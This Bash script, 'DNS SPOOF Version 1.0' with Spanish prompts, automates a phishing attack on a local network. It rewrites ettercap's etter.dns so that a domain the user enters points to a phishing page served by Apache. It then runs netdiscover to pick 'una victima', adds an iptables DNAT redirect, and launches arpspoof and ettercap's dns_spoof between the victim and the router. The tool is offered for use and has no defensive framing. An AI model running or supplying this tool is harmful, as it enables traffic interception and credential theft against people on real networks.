#!/bin/bash

echo " "
echo "           ▓█████▄  ███▄    █   ██████   ██████  ██▓███   ▒█████   ▒█████    █████▒       "
echo "           ▒██▀ ██▌ ██ ▀█   █ ▒██    ▒ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒        "
echo "           ░██   █▌▓██  ▀█ ██▒░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░        "
echo "           ░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░        "
echo "           ░▒████▓ ▒██░   ▓██░▒██████▒▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░           "
echo "            ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░           "
echo "            ░ ▒  ▒ ░ ░░   ░ ▒░░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░             "
echo "            ░ ░  ░    ░   ░ ░ ░  ░  ░  ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░           "
echo "              ░             ░       ░        ░               ░ ░      ░ ░                 "
echo "            ░                                                                             "
echo "                                                                                          "
echo " "
echo "                                  DNS SPOOF Version 1.0                                   "
echo " "
echo "                                  Created BY Anonimo501                                   "
echo "                            https://youtube.com/c/Anonimo501                              "
echo " "
echo " "
echo " "
read -rsp $'Press enter to continue...\n'

echo " "
echo "          **************************************************************************************************"
echo "          * Por favor vaya a la ruta /var/www/html/ y cree un index.html con la pagina phishing que desea  *"
echo "          **************************************************************************************************"
echo " "
echo "          Este script usara:"
echo " "
echo "          Ettercap "
echo "          Apache2  "
echo "          ArpSpoof "
echo "          Dnsspoof "
echo " "
read -rsp $'Press enter to continue...\n'

echo " "
echo "          **********************************************************************"
echo "          * ingresa dominio de la pagina a clonar (http) Ejemplo: unoraya.com  *"
echo "          **********************************************************************"
echo " "
read dominio

#wget -r -k $url 
#cp index.html /var/www/html/index.html

# Se habilita el forward
echo 1 > /proc/sys/net/ipv4/ip_forward

# se elimina el archivo etter.dns
rm -rf /etc/ettercap/etter.dns
echo "

############################################################################
#                                                                          #
#  ettercap -- etter.dns -- host file for dns_spoof plugin                 #
#                                                                          #
#  Copyright (C) ALoR & NaGA                                               #
#                                                                          #
#  This program is free software; you can redistribute it and/or modify    #
#  it under the terms of the GNU General Public License as published by    #
#  the Free Software Foundation; either version 2 of the License, or       #
#  (at your option) any later version.                                     #
#                                                                          #
############################################################################
#                                                                          #
# Sample hosts file for dns_spoof plugin                                   #
#                                                                          #
# the format is (for A query):                                             #
#   www.myhostname.com A 168.11.22.33                                      #
#   *.foo.com          A 168.44.55.66                                      #
#                                                                          #
# ... for a AAAA query (same hostname allowed):                            #
#   www.myhostname.com AAAA 2001:db8::1                                    #
#   *.foo.com          AAAA 2001:db8::2                                    #
#                                                                          #
# or to skip a protocol family (useful with dual-stack):                   #
#   www.hotmail.com    AAAA ::                                             #
#   www.yahoo.com      A    0.0.0.0                                        #
#                                                                          #
# or for PTR query:                                                        #
#   www.bar.com    PTR 10.0.0.10                                           #
#   www.google.com PTR ::1                                                 #
#                                                                          #
# or for MX query (either IPv4 or IPv6):                                   #
#    domain.com MX xxx.xxx.xxx.xxx                                         #
#    domain2.com MX xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx                #
#    domain3.com MX xxxx:xxxx::y                                           #
#                                                                          #
# or for WINS query:                                                       #
#    workgroup WINS 127.0.0.1                                              #
#    PC*       WINS 127.0.0.1                                              #
#                                                                          #
# or for SRV query (either IPv4 or IPv6):                                  #
#    service._tcp|_udp.domain SRV 192.168.1.10:port                        #
#    service._tcp|_udp.domain SRV [2001:db8::3]:port                       #
#                                                                          #
# or for TXT query (value must be wrapped in double quotes):               #
#    google.com TXT "v=spf1 ip4:192.168.0.3/32 ~all"                       #
#                                                                          #
# NOTE: the wildcarded hosts can't be used to poison the PTR requests      #
#       so if you want to reverse poison you have to specify a plain       #
#       host. (look at the www.microsoft.com example)                      #
#                                                                          #
############################################################################

################################
# microsoft sucks ;)
# redirect it to www.linux.org
#

# microsoft.com      A   107.170.40.56
# *.microsoft.com    A   107.170.40.56
# www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed

#*www.google.com          A     /var/www/html/index.html
#*www.facebook.com A    /var/www/html/index.html
#*unoraya.com     A     /var/www/html/index.html

*$dominio       A     /var/www/html/index.html
$dominio        PTR   /var/www/html/index.html

##########################################
# no one out there can have our domains...
#

www.alor.org  A 127.0.0.1
www.naga.org  A 127.0.0.1
www.naga.org  AAAA 2001:db8::2

##########################################
# dual stack enabled hosts does not make life easy
# force them back to single stack 

www.ietf.org   A    127.0.0.1
www.ietf.org   AAAA ::

www.example.org  A    0.0.0.0
www.example.org  AAAA ::1

###############################################
# one day we will have our ettercap.org domain
#

www.ettercap.org           A  127.0.0.1
www.ettercap-project.org   A  127.0.0.1
ettercap.sourceforge.net   A  23.235.43.133
www.ettercap.org           PTR ::1

###############################################
# some MX examples
#

alor.org   MX  127.0.0.1
naga.org   MX  127.0.0.1
example.org MX 127.0.0.2
microsoft.com MX 2001:db8::1ce:c01d:bee3

###############################################
# This messes up NetBIOS clients using DNS
# resolutions. I.e. Windows/Samba file sharing.
#

LAB-PC*  WINS  127.0.0.1

###############################################
# some service discovery examples

xmpp-server._tcp.jabber.org SRV 192.168.1.10:5269
ldap._udp.mynet.com SRV [2001:db8:c001:beef::1]:389

###############################################
# little example for TXT records
#

naga.org TXT "v=spf1 ip4:192.168.1.2 ip6:2001:db8:d0b1:beef::2 -all"


# vim:ts=8:noexpandtab

" >> /etc/ettercap/etter.dns

# Se habilita el servicio apache2 
echo " "
service apache2 start
service apache2 restart

echo "          ********************************************************************************"
echo "          * Antes de continuar tenga en cuenta que la interface que usara Ejemplo: wlan0 *"
echo "          * Debe tener una ip de la red donde hara el ataque (verifique)                 *"
echo "          ********************************************************************************"
echo " "
read -rsp $'Press enter to continue...\n'

echo " "
echo "          ***********************************************"
echo "          * Ingrese la interface de Red. Ejemplo: wlan0 *"
echo "          ***********************************************"
echo " "
read interface

echo " "
echo "          ****************************"
echo "          * Busquemos una victima :) *"
echo "          ****************************"
echo " "
read -rsp $'Press enter to continue...\n'

gnome-terminal -e "netdiscover"

echo " "
echo "          ********************************************************************"
echo "          * Una vez sepas que IP Atacar cierra la ventana del escaneo de IPs *"
echo "          ********************************************************************"
echo " "
read -rsp $'Press enter to continue...\n'

echo " "
echo "          *******************************************************"
echo "          * Ingrese la IP de la Victima. Ejemplo: 192.168.1.100 *"
echo "          *******************************************************"
echo " "
read victima

echo " "
echo "          *******************************************************"
echo "          * Ingrese la IP del Router. Ejemplo: 192.168.1.1      *"
echo "          *******************************************************"
echo " "
read router

echo " "
echo "          ******************************************************************************************"
echo "          * Ingrese la TU IP de Atacante. Ejemplo: 192.168.1.70 (Esto para configurar el iptables) *"
echo "          ******************************************************************************************"
echo " "
read ipatacante

iptables -t nat -A PREROUTING -p tcp -s $victima --dport 80 -j DNAT --to-destination $ipatacante:80

gnome-terminal -e "arpspoof -i $interface -t $victima -r $router"
gnome-terminal -e "ettercap -T -q -i $interface -M arp:remote -P dns_spoof //$router// //$victima//"


